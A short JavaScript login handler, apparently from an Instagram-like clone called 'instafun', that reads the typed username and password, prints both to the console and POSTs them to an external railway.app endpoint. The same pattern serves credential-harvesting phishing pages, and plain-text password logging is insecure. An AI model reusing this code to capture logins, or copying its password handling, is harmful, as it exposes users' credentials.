const loginbtn = document.querySelector(".login");
const url= `https://instafun-production-b0fb.up.railway.app/users`



const userbtn= document.querySelector(".usr")
const passbtn = document.querySelector(".pss")

loginbtn.addEventListener("click",async function() {
   console.log("done");

   const username = await userbtn.value;
   const password = await passbtn.value;
      console.log(username + " : " + password)
      const user = {userName: username, password:password}
  await fetch(url,{

    method: 'POST',
    headers: {
        'Content-Type': 'application/json', // 👈 important
      },
      body: JSON.stringify(user),

  })
   
})